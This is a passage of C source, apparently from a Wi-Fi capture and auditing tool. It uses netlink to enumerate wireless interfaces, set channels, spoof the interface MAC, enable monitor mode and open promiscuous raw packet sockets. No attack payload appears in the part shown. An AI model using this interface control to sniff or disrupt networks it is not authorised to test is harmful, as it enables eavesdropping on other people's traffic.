NL80211_CMD_GET_WIPHY;\nglh->version = 1;\nglh->reserved = 0;\ni += sizeof(struct genlmsghdr);\nnla = (struct nlattr*)(nltxbuffer + i);\nnla->nla_len = 4;\nnla->nla_type = NL80211_ATTR_SPLIT_WIPHY_DUMP;\n*(u32*)nla_data(nla) = ifaktindex;\ni += 4;\nnlh->nlmsg_len = i;\nif((write(fd_socket_nl, nltxbuffer, i)) != i) return false;\nii = 0;\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_nl, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return true;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return true;\n\t\t\terrorcount++;\n\t\t\treturn false;\n\t\t\t}\n\t\tnlremlen = 0;\n\t\tglh = (struct genlmsghdr*)NLMSG_DATA(nlh);\n\t\tif(glh->cmd != NL80211_CMD_NEW_WIPHY) continue;\n\t\tnla = (struct nlattr*)((unsigned char*)NLMSG_DATA(nlh) + sizeof(struct genlmsghdr));\n\t\tnlremlen = NLMSG_PAYLOAD(nlh, 0) -4;\n\t\twhile(nla_ok(nla, nlremlen))\n\t\t\t{\n\t\t\tif(nla->nla_type == NL80211_ATTR_WIPHY)\n\t\t\t\t{\n\t\t\t\t(ifpresentlist + ii)->wiphy = *((u32*)nla_data(nla));\n\t\t\t\tsnprintf(driverfmt, DRIVER_FORMAT, \"/sys/class/ieee80211/phy%d/device/driver\", (ifpresentlist + ii)->wiphy);\n\t\t\t\tmemset(&driverlink, 0, DRIVER_LINK);\n\t\t\t\tif((dnlen = readlink(driverfmt, driverlink, DRIVER_LINK)) > 0)\n\t\t\t\t\t{\n\t\t\t\t\tdrivername = basename(driverlink);\n\t\t\t\t\tif(drivername != NULL) strncpy((ifpresentlist + ii)->driver, drivername, DRIVERNAME_MAX -1);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\tif(nla->nla_type == NL80211_ATTR_SUPPORTED_IFTYPES)\n\t\t\t\t{\n\t\t\t\t(ifpresentlist + ii)->type |= nl_get_supported_iftypes(nla);\n\t\t\t\t(ifpresentlist + ii)->type |= IF_HAS_NETLINK;\n\t\t\t\t}\n\t\t\tif(nla->nla_type == NL80211_ATTR_WIPHY_BANDS) nl_get_supported_bands((ifpresentlist + ii), nla);\n\t\t\tif(nla->nla_type == NL80211_ATTR_FEATURE_FLAGS)\n\t\t\t\t{\n\t\t\t\tif((*((u32*)nla_data(nla)) & NL80211_FEATURE_ACTIVE_MONITOR) == NL80211_FEATURE_ACTIVE_MONITOR) (ifpresentlist + ii)->type |= IF_HAS_MONITOR_ACTIVE;\n\t\t\t\t}\n\t\t\tnla = nla_next(nla, &nlremlen);\n\t\t\t}\n\t\t}\n\tif(ii < INTERFACELIST_MAX) ii++;\n\t}\nreturn false;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) bool nl_set_frequency(void)\n{\nstatic ssize_t i;\nstatic ssize_t msglen;\nstatic struct nlmsghdr *nlh;\nstatic struct genlmsghdr *glh;\nstatic struct nlattr *nla;\nstatic struct nlmsgerr *nle;\n\ni = 0;\nif(((scanlist + scanlistindex)->frequency) == 0) scanlistindex = 0;\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = nlfamily;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nglh = (struct genlmsghdr*)(nltxbuffer + i);\nglh->cmd = NL80211_CMD_SET_WIPHY;\nglh->version = 1;\nglh->reserved = 0;\ni += sizeof(struct genlmsghdr);\nnla = (struct nlattr*)(nltxbuffer + i);\nnla->nla_len = 8;\nnla->nla_type = NL80211_ATTR_IFINDEX;\n*(u32*)nla_data(nla) = ifaktindex;\ni += 8;\nnla = (struct nlattr*)(nltxbuffer + i);\nnla->nla_len = 8;\nnla->nla_type = NL80211_ATTR_WIPHY_FREQ;\n*(u32*)nla_data(nla) = (scanlist + scanlistindex)->frequency;\ni += 8;\nnlh->nlmsg_len = i;\nif((write(fd_socket_nl, nltxbuffer, i)) != i)\n\t{\n\t#ifdef HCXDEBUG\n\tfprintf(fh_debug, \"nl_set_frequency failed: %s\\n\", strerror(errno));\n\t#endif\n\treturn false;\n\t}\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_nl, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return true;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return true;\n\t\t\terrorcount++;\n\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t}\nreturn false;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline void nl_set_powersave_off(void)\n{\nstatic ssize_t i;\nstatic ssize_t msglen;\nstatic struct nlmsghdr *nlh;\nstatic struct genlmsghdr *glh;\nstatic struct nlattr *nla;\nstatic struct nlmsgerr *nle;\n\ni = 0;\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = nlfamily;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nglh = (struct genlmsghdr*)(nltxbuffer + i);\nglh->cmd = NL80211_CMD_SET_INTERFACE;\nglh->version = 1;\nglh->reserved = 0;\ni += sizeof(struct genlmsghdr);\nnla = (struct nlattr*)(nltxbuffer + i);\nnla->nla_len = 8;\nnla->nla_type = NL80211_ATTR_IFINDEX;\n*(u32*)nla_data(nla) = ifaktindex;\ni += 8;\nnla = (struct nlattr*)(nltxbuffer + i);\nnla->nla_len = 8;\nnla->nla_type = NL80211_ATTR_PS_STATE;\n*(u32*)nla_data(nla) = NL80211_PS_DISABLED;\ni += 8;\nnlh->nlmsg_len = i;\nif((write(fd_socket_nl, nltxbuffer, i)) != i)\n\t{\n\t#ifdef HCXDEBUG\n\tfprintf(fh_debug, \"nl_set_powersave_off failed: %s\\n\", strerror(errno));\n\t#endif\n\treturn;\n\t}\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_nl, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return;\n\t\t\terrorcount++;\n\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline bool nl_set_monitormode(void)\n{\nstatic ssize_t i;\nstatic ssize_t msglen;\nstatic struct nlmsghdr *nlh;\nstatic struct genlmsghdr *glh;\nstatic struct nlattr *nla;\nstatic struct nlmsgerr *nle;\n\ni = 0;\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = nlfamily;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nglh = (struct genlmsghdr*)(nltxbuffer + i);\nglh->cmd = NL80211_CMD_SET_INTERFACE;\nglh->version = 1;\nglh->reserved = 0;\ni += sizeof(struct genlmsghdr);\nnla = (struct nlattr*)(nltxbuffer + i);\nnla->nla_len = 8;\nnla->nla_type = NL80211_ATTR_IFINDEX;\n*(u32*)nla_data(nla) = ifaktindex;\ni += 8;\nnla = (struct nlattr*)(nltxbuffer + i);\nnla->nla_len = 8;\nnla->nla_type = NL80211_ATTR_IFTYPE;\n*(u32*)nla_data(nla) = NL80211_IFTYPE_MONITOR;\ni += 8;\nif(((ifakttype & IFTYPEMONACT) == IFTYPEMONACT) && (activemonitorflag == true))\n\t{\n\tnla = (struct nlattr*)(nltxbuffer + i);\n\tnla->nla_len = 8;\n\tnla->nla_type = NL80211_ATTR_MNTR_FLAGS;\n\tnla = (struct nlattr*)nla_data(nla);\n\tnla->nla_len = 4;\n\tnla->nla_type = NL80211_MNTR_FLAG_ACTIVE;\n\ti += 8;\n\t}\nnlh->nlmsg_len = i;\nif((write(fd_socket_nl, nltxbuffer, i)) != i) return false;\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_nl, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return true;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return true;\n\t\t\terrorcount++;\n\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t}\nreturn false;\n}\n/*===========================================================================*/\n/* RTLINK */\nstatic void *rta_data(const struct rtattr *rta)\n{\nreturn (u8*)rta +4;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool rt_set_interfacemac(void)\n{\nstatic ssize_t i;\nstatic ssize_t msglen;\nstatic struct nlmsghdr *nlh;\nstatic struct ifinfomsg *ifih;\nstatic struct rtattr *rta;\nstatic struct nlmsgerr *nle;\n\ni = 0;\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = RTM_NEWLINK;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nifih = (struct ifinfomsg*)(nltxbuffer+ i);\nifih->ifi_family = 0;\nifih->ifi_type = 0;\nifih->ifi_index = ifaktindex;\nifih->ifi_flags = 0;\nifih->ifi_change = 0;\ni += sizeof(struct ifinfomsg);\nrta = (struct rtattr*)(nltxbuffer+ i);\nrta->rta_len = 10;\nrta->rta_type = IFLA_ADDRESS;\nmemcpy(&nltxbuffer[i + 4], &macclientrg, ETH_ALEN +2);\ni += 12;\nnlh->nlmsg_len = i;\nif((write(fd_socket_rt, nltxbuffer, i)) != i) return false;\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_rt, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return false;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return true;\n\t\t\terrorcount++;\n\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t}\nreturn false;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool rt_set_interface(u32 condition)\n{\nstatic ssize_t i;\nstatic ssize_t msglen;\nstatic struct nlmsghdr *nlh;\nstatic struct ifinfomsg *ifih;\nstatic struct nlmsgerr *nle;\n\ni = 0;\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = RTM_NEWLINK;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nifih = (struct ifinfomsg*)(nltxbuffer+ i);\nifih->ifi_family = 0;\nifih->ifi_type = 0;\nifih->ifi_index = ifaktindex;\nifih->ifi_flags = condition;\nifih->ifi_change = 1;\ni += sizeof(struct ifinfomsg);\nnlh->nlmsg_len = i;\nif((write(fd_socket_rt, nltxbuffer, i)) != i) return false;\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_rt, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return false;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return true;\n\t\t\terrorcount++;\n\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t}\nreturn false;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool rt_get_interfacestatus(void)\n{\nstatic ssize_t i;\nstatic ssize_t msglen;\nstatic struct nlmsghdr *nlh;\nstatic struct ifinfomsg *ifih;\nstatic struct nlmsgerr *nle;\n\ni = 0;\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = RTM_GETLINK;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nifih = (struct ifinfomsg*)(nltxbuffer+ i);\nifih->ifi_family = AF_PACKET;\nifih->ifi_type = 0;\nifih->ifi_index = ifaktindex;\nifih->ifi_flags = 0;\nifih->ifi_change = 0;\ni += sizeof(struct ifinfomsg);\nnlh->nlmsg_len = i;\nif((write(fd_socket_rt, nltxbuffer, i)) != i) return false;\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_rt, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return false;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return true;\n\t\t\terrorcount++;\n\t\t\treturn false;\n\t\t\t}\n\t\tifih = (struct ifinfomsg*)NLMSG_DATA(nlh);\n\t\tif((ifih->ifi_flags & IFF_UP) == IFF_UP) ifaktstatus |= IF_STAT_UP;\n\t\t}\n\t}\nreturn false;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool rt_get_interfacelist(void)\n{\nstatic ssize_t i;\nstatic ssize_t msglen;\nstatic struct nlmsghdr *nlh;\nstatic struct ifinfomsg *ifih;\nstatic struct nlmsgerr *nle;\nstatic struct rtattr *rta;\nstatic int rtaremlen;\nstatic u8 hwmac[ETH_ALEN];\n\ni = 0;\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = RTM_GETLINK;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nifih = (struct ifinfomsg*)(nltxbuffer+ i);\nifih->ifi_family = AF_PACKET;\nifih->ifi_type = 0;\nifih->ifi_index = 0;\nifih->ifi_flags = 0;\nifih->ifi_change = 0;\ni += sizeof(struct ifinfomsg);\nrta = (struct rtattr*)(nltxbuffer+ i);\nrta->rta_type = IFLA_EXT_MASK;\n*(u32*)rta_data(rta) = 1;\nrta->rta_len = 8;\ni += 8;\nnlh->nlmsg_len = i;\nif((write(fd_socket_rt, nltxbuffer, i)) != i) return false;\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_rt, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return true;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return true;\n\t\t\terrorcount++;\n\t\t\treturn false;\n\t\t\t}\n\t\tifih = (struct ifinfomsg*)NLMSG_DATA(nlh);\n\t\tif((ifih->ifi_flags & IFF_UP) == IFF_UP) ifaktstatus |= IF_STAT_UP;\n\t\trta = (struct rtattr*)((unsigned char*)NLMSG_DATA(nlh) + sizeof(struct ifinfomsg));\n\t\trtaremlen = NLMSG_PAYLOAD(nlh, 0) - sizeof(struct ifinfomsg);\n\t\twhile(RTA_OK(rta, rtaremlen))\n\t\t\t{\n\t\t\t#if(LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0))\n\t\t\tif(rta->rta_type == IFLA_PERM_ADDRESS)\n\t\t\t\t{\n\t\t\t\tif(rta->rta_len == 10) memcpy(hwmac, rta_data(rta), ETH_ALEN);\n\t\t\t\t}\n\t\t\t#else\n\t\t\tif(rta->rta_type == IFLA_ADDRESS)\n\t\t\t\t{\n\t\t\t\tif(rta->rta_len == 10) memcpy(hwmac, rta_data(rta), ETH_ALEN);\n\t\t\t\t}\n\t\t\t#endif\n\t\t\trta = RTA_NEXT(rta, rtaremlen);\n\t\t\t}\n\t\tfor(i = 0; i < INTERFACELIST_MAX; i++)\n\t\t\t{\n\t\t\tif((ifpresentlist +i)->index == ifih->ifi_index) memcpy((ifpresentlist +i)->hwmac, &hwmac, ETH_ALEN);\n\t\t\t}\n\t\t}\n\t}\nreturn false;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool nl_get_familyid(void)\n{\nstatic ssize_t i;\nstatic ssize_t msglen;\nstatic struct nlmsghdr *nlh;\nstatic struct genlmsghdr *glh;\nstatic struct nlattr *nla;\nstatic struct nlmsgerr *nle;\nstatic int nlremlen = 0;\n\ni = 0;\nnlfamily = 0;\nnlh = (struct nlmsghdr*)nltxbuffer;\nnlh->nlmsg_type = GENL_ID_CTRL;\nnlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;\nnlh->nlmsg_seq = nlseqcounter++;\nnlh->nlmsg_pid = hcxpid;\ni += sizeof(struct nlmsghdr);\nglh = (struct genlmsghdr*)(nltxbuffer + i);\nglh->cmd = CTRL_CMD_GETFAMILY;\nglh->version = 1;\nglh->reserved = 0;\ni += sizeof(struct genlmsghdr);\nnla = (struct nlattr*)(nltxbuffer + i);\nnla->nla_type = CTRL_ATTR_FAMILY_NAME;\ni += sizeof(struct nlattr);\nmemcpy(nltxbuffer +i, NL80211_GENL_NAME, sizeof(NL80211_GENL_NAME));\ni += sizeof(NL80211_GENL_NAME);\nnla->nla_len = sizeof(struct nlattr) + sizeof(NL80211_GENL_NAME);\nnlh->nlmsg_len = i;\nif((write(fd_socket_nl, nltxbuffer, i)) != i) return false;\nwhile(1)\n\t{\n\tmsglen = read(fd_socket_nl, &nlrxbuffer, NLRX_SIZE);\n\tif(msglen == -1) break;\n\tif(msglen == 0) break;\n\tfor(nlh = (struct nlmsghdr*)nlrxbuffer; NLMSG_OK(nlh, (u32)msglen); nlh = NLMSG_NEXT(nlh, msglen))\n\t\t{\n\t\tif(nlh->nlmsg_type == NLMSG_DONE) return true;\n\t\tif(nlh->nlmsg_type == NLMSG_ERROR)\n\t\t\t{\n\t\t\tnle = (struct nlmsgerr*)(nlrxbuffer + sizeof(struct nlmsghdr));\n\t\t\tif(nle->error == 0) return true;\n\t\t\terrorcount++;\n\t\t\tnlfamily = 0;\n\t\t\treturn false;\n\t\t\t}\n\t\tglh = (struct genlmsghdr*)NLMSG_DATA(nlh);\n\t\tnla = (struct nlattr*)((unsigned char*)NLMSG_DATA(nlh) + sizeof(struct genlmsghdr));\n\t\tnlremlen = 0;\n\t\tnlremlen = NLMSG_PAYLOAD(nlh, 0) -4;\n\t\twhile(nla_ok(nla, nlremlen))\n\t\t\t{\n\t\t\tif(nla->nla_type == CTRL_ATTR_FAMILY_ID) nlfamily = *((u16*)nla_data(nla));\n\t\t\tnla = nla_next(nla, &nlremlen);\n\t\t\t}\n\t\t}\n\t}\nnlfamily = 0;\nreturn false;\n}\n/*===========================================================================*/\nstatic void usrfrequency_to_scanlist(u16 ufrq)\n{\nsize_t i;\n\nif(ufrq == 0) return;\nfor(i = 0; i < (FREQUENCYLIST_MAX -1); i++)\n\t{\n\tif((ifaktfrequencylist +i)->status == 0)\n\t\t{\n\t\tif((ifaktfrequencylist +i)->frequency == ufrq)\n\t\t\t{\n\t\t\t(scanlist + scanlistindex)->frequency = ufrq;\n\t\t\t(scanlist + scanlistindex)->channel = frequency_to_channel(ufrq);\n\t\t\tscanlistindex++;\n\t\t\tif(scanlistindex >= (FREQUENCYLIST_MAX -1)) return;\n\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool set_interface(bool interfacefrequencyflag, char *userfrequencylistname, char *userchannellistname, bool monitorflag)\n{\nstatic size_t i;\nstatic char *ufld = NULL;\nstatic char *tokptr = NULL;\nstatic char *userband = NULL;\nstatic u16 uband;\nstatic u32 ufreq;\n\nif(ifaktindex == 0)\n\t{\n\tfor(i = 0; i < ifpresentlistcounter; i++)\n\t\t{\n\t\tif(((ifpresentlist +i)->type & IF_HAS_NLMON) == IF_HAS_NLMON)\n\t\t\t{\n\t\t\tifaktindex = (ifpresentlist +i)->index;\n\t\t\tifakttype = (ifpresentlist +i)->type;\n\t\t\tmemcpy(&ifaktname, (ifpresentlist +i)->name, IF_NAMESIZE);\n\t\t\tmemcpy(&ifakthwmac, (ifpresentlist +i)->hwmac, ETH_ALEN);\n\t\t\tifaktfrequencylist = (ifpresentlist +i)->frequencylist;\n\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\nelse\n\t{\n\tfor(i = 0; i < ifpresentlistcounter; i++)\n\t\t{\n\t\tif((ifpresentlist +i)->index == ifaktindex)\n\t\t\t{\n\t\t\tif(((ifpresentlist +i)->type & IF_HAS_NLMON) == 0) return false;\n\t\t\tifakttype = (ifpresentlist +i)->type;\n\t\t\tmemcpy(&ifakthwmac, (ifpresentlist +i)->hwmac, ETH_ALEN);\n\t\t\tifaktfrequencylist = (ifpresentlist +i)->frequencylist;\n\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\nif(ifaktfrequencylist == NULL) return false;\nif(rt_set_interface(0) == false) return false;\nif(rt_set_interfacemac() == false) vmflag = false;\nif(nl_set_monitormode() == false) return false;\nif(rt_set_interface(IFF_UP) == false) return false;\nnl_set_powersave_off();\nif(nl_get_interfacestatus() == false) return false;\nif(rt_get_interfacestatus() == false) return false;\nscanlistindex = 0;\nif(interfacefrequencyflag == true)\n\t{\n\tfor(i = 0; i < (FREQUENCYLIST_MAX -1); i++)\n\t\t{\n\t\tif((ifaktfrequencylist +i)->status == 0)\n\t\t\t{\n\t\t\t(scanlist + scanlistindex)->frequency = (ifaktfrequencylist +i)->frequency;\n\t\t\t(scanlist + scanlistindex)->channel = (ifaktfrequencylist +i)->channel;\n\t\t\tscanlistindex++;\n\t\t\tif(scanlistindex >= (FREQUENCYLIST_MAX -1)) break;\n\t\t\t}\n\t\tif((ifaktfrequencylist +i)->frequency == 0) break;\n\t\t}\n\t}\nelse if((userfrequencylistname != NULL) || (userchannellistname != NULL))\n\t{\n\tif(userfrequencylistname != NULL)\n\t\t{\n\t\tufld = strdup(userfrequencylistname);\n\t\ttokptr = strtok(ufld, \",\");\n\t\twhile((tokptr != NULL) && (i < (SCANLIST_MAX - 1)))\n\t\t\t{\n\t\t\tusrfrequency_to_scanlist(strtol(tokptr, NULL, 10));\n\t\t\ttokptr = strtok(NULL, \",\");\n\t\t\t}\n\t\tfree(ufld);\n\t\t}\n\tif(userchannellistname != NULL)\n\t\t{\n\t\tufld = strdup(userchannellistname);\n\t\ttokptr = strtok(ufld, \",\");\n\t\twhile((tokptr != NULL) && (i < (SCANLIST_MAX - 1)))\n\t\t\t{\n\t\t\tuband = strtol(tokptr, &userband, 10);\n\t\t\tif(userband[0] == 'a') ufreq = channel_to_frequency(uband, NL80211_BAND_2GHZ);\n\t\t\telse if(userband[0] == 'b') ufreq = channel_to_frequency(uband, NL80211_BAND_5GHZ);\n\t\t\t#if(LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0))\n\t\t\telse if(userband[0] == 'c') ufreq = channel_to_frequency(uband, NL80211_BAND_6GHZ);\n\t\t\telse if(userband[0] == 'd') ufreq = channel_to_frequency(uband, NL80211_BAND_60GHZ);\n\t\t\telse if(userband[0] == 'e') ufreq = channel_to_frequency(uband, NL80211_BAND_S1GHZ);\n\t\t\t#endif\n\t\t\tusrfrequency_to_scanlist(ufreq);\n\t\t\ttokptr = strtok(NULL, \",\");\n\t\t\t}\n\t\tfree(ufld);\n\t\t}\n\t}\nelse\n\t{\n\t(scanlist + scanlistindex)->frequency = 2412;\n\t(scanlist + scanlistindex++)->channel = 1;\n\t(scanlist + scanlistindex)->frequency = 2437;\n\t(scanlist + scanlistindex++)->channel = 6;\n\t(scanlist + scanlistindex)->frequency = 2462;\n\t(scanlist + scanlistindex++)->channel = 11;\n\t(scanlist + scanlistindex)->frequency = 0;\n\t(scanlist + scanlistindex)->channel = 0;\n\t}\nscanlistindex = 0;\nif(nl_set_frequency() == false) return false;\nif(monitorflag == false) show_interfacecapabilities2();\nreturn true;\n}\n/*===========================================================================*/\nstatic bool set_monitormode(void)\n{\nif(rt_set_interface(0) == false) return false;\nif(nl_set_monitormode() == false) return false;\nif(rt_set_interface(IFF_UP) == false) return false;\nif(nl_get_interfacestatus() == false) return false;\nif(rt_get_interfacestatus() == false) return false;\nshow_interfacecapabilities();\nfprintf(stdout, \"\\n\\nmonitor mode is active...\\n\");\nreturn true;\n}\n/*===========================================================================*/\nstatic bool get_interfacelist(void)\n{\nstatic size_t i;\n\nnl_get_familyid();\nif(nlfamily == 0)\n\t{\n\terrorcount++;\n\treturn false;\n\t}\nnl_get_regulatorydomain();\nif(nl_get_interfacecapabilities() == false) return false;\nif(nl_get_interfacelist() == false) return false;\nfor(i = 0; i < INTERFACELIST_MAX -1; i++)\n\t{\n\tif((ifpresentlist +i)->index == 0) break;\n\tifpresentlistcounter++;\n\t}\nif(rt_get_interfacelist() == false) return false;\nif(ifpresentlist->index == 0) return false;\nqsort(ifpresentlist, ifpresentlistcounter, INTERFACELIST_SIZE, sort_interfacelist_by_index);\nreturn true;\n}\n/*===========================================================================*/\n/* RAW PACKET SOCKET */\nstatic bool open_socket_tx(void)\n{\nstatic struct sockaddr_ll saddr;\nstatic struct packet_mreq mrq;\nstatic int socket_tx_flags;\nstatic int prioval;\nstatic socklen_t priolen;\n\nif((fd_socket_tx = socket(PF_PACKET, SOCK_RAW | SOCK_CLOEXEC, htons(ETH_P_ALL))) < 0) return false;\nmemset(&mrq, 0, sizeof(mrq));\nmrq.mr_ifindex = ifaktindex;\nmrq.mr_type = PACKET_MR_PROMISC;\nif(setsockopt(fd_socket_tx, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mrq, sizeof(mrq)) < 0) return false;\npriolen = sizeof(prioval);\nprioval = 20;\nif(setsockopt(fd_socket_rx, SOL_SOCKET, SO_PRIORITY, &prioval, priolen) < 0) return false;\nmemset(&saddr, 0, sizeof(saddr));\nsaddr.sll_family = PF_PACKET;\nsaddr.sll_ifindex = ifaktindex;\nsaddr.sll_protocol = htons(ETH_P_ALL);\nsaddr.sll_halen = ETH_ALEN;\nsaddr.sll_pkttype = PACKET_OTHERHOST;\nif(bind(fd_socket_tx, (struct sockaddr*) &saddr, sizeof(saddr)) < 0) return false;\nif((socket_tx_flags = fcntl(fd_socket_tx, F_GETFL, 0)) < 0) return false;\nif(fcntl(fd_socket_tx, F_SETFL, socket_tx_flags | O_NONBLOCK) < 0) return false;\nreturn true;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool open_socket_rx(char *bpfname)\n{\nstatic size_t c = 10;\nstatic struct sockaddr_ll saddr;\nstatic struct packet_mreq mrq;\n#if(LINUX_VERSION_CODE >= KERNEL_VERSION(4, 20, 0))\n static int enable = 1;\n#endif\nstatic int socket_rx_flags;\nstatic int prioval;\nstatic socklen_t priolen;\n\nbpf.len = 0;\nif(bpfname != NULL)\n\t{\n\tif(read_bpf(bpfname) == false)\n\t\t{\n\t\terrorcount++;\n\t\tfprintf(stderr, \"failed to read BPF\\n\");\n\t\treturn false;\n\t\t}\n\t}\nif((fd_socket_rx = socket(PF_PACKET, SOCK_RAW | SOCK_CLOEXEC, htons(ETH_P_ALL))) < 0) return 